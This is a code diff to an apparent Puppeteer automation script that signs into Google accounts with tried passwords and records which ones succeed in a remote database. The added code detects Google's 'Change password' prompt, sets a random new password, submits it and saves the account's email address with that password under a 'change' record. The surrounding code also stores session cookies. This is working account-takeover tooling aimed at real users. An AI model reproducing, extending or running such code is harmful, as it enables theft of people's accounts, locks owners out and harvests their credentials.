@@ -11,6 +11,8 @@ let mLoadSuccess = false
 let mPrevNumber = 0
 let mPasswordTry = 0
 let mCapture = false
+let mPassword = 'null'
+let mPasswordChange = false
 let mLoadPassword = false
 let mLogoutGmail = false
 let mGmailCheck = false
@@ -264,9 +266,7 @@ async function startService() {
                 if(pageUrl == 'https://myaccount.google.com/security' || pageUrl.startsWith('https://gds.google.com/web/chip') || pageUrl.startsWith('https://myaccount.google.com/signinoptions/recovery-options-collection')) {
                     mLoadPassword = false
                     mGmailCheck = true
-                    if(pageUrl != 'https://myaccount.google.com/security') {
-                        await page.goto('https://myaccount.google.com/security')
-                    }
+                    await page.goto('https://myaccount.google.com/email')
                 } else {
                     await delay(2000)
                     const header = await page.evaluate(() => {
@@ -289,28 +289,53 @@ async function startService() {
                                 return '4'
                             } else if(text.includes('Your account has been disabled')) {
                                 return '5'
+                            } else if(text.includes(`Change password`)) {
+                                return '6'
                             }
                         }
                         return '0'
                     })
 
                     if(header != 0 && mLoadPassword) {
-                        mLoadPassword = false
-                        mNumber++
-                        mLoad++
-                        if(header == 1) {
-                            database.child('menually').child(mNumber-1).set(mPasswordTry)
+                        if(header == 6) {
+                            mPasswordChange = true
+
+                            let random = getRandomPassword()
+                            if(random != mPassword) {
+                                mPassword = random
+                                await page.evaluate((pass) => {
+                                    let root = document.querySelectorAll('input.whsOnd.zHQkBf')
+                                    if(root) {
+                                        if(root.length == 2) {
+                                            root[0].value = pass
+                                            root[1].value = pass
+                                        }
+                                    }
+                                }, mPassword)
+    
+                                console.log('Password: '+mPassword)
+    
+                                await page.evaluate(() => document.querySelector('div.VfPpkd-RLmnJb').click())
+                            }
                         } else {
-                            database.child('reject').child(mNumber-1).set(mPasswordTry)
+                            mLoadPassword = false
+                            mNumber++
+                            mLoad++
+                            if(header == 1) {
+                                database.child('menually').child(mNumber-1).set(mPasswordTry)
+                            } else {
+                                database.child('reject').child(mNumber-1).set(mPasswordTry)
+                            }
+                            database.child('server').child(SERVER).child('runing_'+SIZE).set(mNumber)
+                            mPasswordTry = 0
+                            mPassword = 'null'
+                            page.goBack()
                         }
-                        database.child('server').child(SERVER).child('runing_'+SIZE).set(mNumber)
-                        mPasswordTry = 0
-                        page.goBack()
                     }
                 }
             } else if(mGmailCheck) {
                 const gmail = await page.evaluate(() => {
-                    let root = document.querySelector('#yDmH0d > div.gb_ce > div > div:nth-child(3)')
+                    let root = document.querySelector('div.mMsbvc')
                     if(root) {
                         return root.innerText
                     } else {
@@ -324,7 +349,13 @@ async function startService() {
                     mLoad++
                     let now = parseInt(new Date().getTime() / 60000)
                     database.child('server').child(SERVER).child('runing_'+SIZE).set(mNumber)
-                    database.child('active').child(gmail.replace('@gmail.com', '').replace('.','')).set({ number : mNumber-1, pass : mPasswordTry, time : now })
+                    if(mPasswordChange) {
+                        database.child('change').child(gmail.replace('@gmail.com', '').replace('.','')).set({ number : mNumber-1, pass : mPassword, time : now })
+                        mPasswordChange = false
+                        mPassword = 'null'
+                    } else {
+                        database.child('active').child(gmail.replace('@gmail.com', '').replace('.','')).set({ number : mNumber-1, pass : mPasswordTry, time : now })
+                    }
                     mPasswordTry = 0
                     await delay(1000)
                     let temp = JSON.parse(fs.readFileSync('./cookies.json'))
@@ -393,6 +424,14 @@ async function checkPassword() {
         await page.evaluate(() => document.querySelector('#passwordNext').click())
         mLoadPassword = true
     }
+}
+
+function getRandomPassword() {
+    if(mPassword == 'null') {
+        return Math.random().toString(36).slice(-10)
+    } else {
+        return mPassword
+    }  
 }
 
 async function delay(time) {
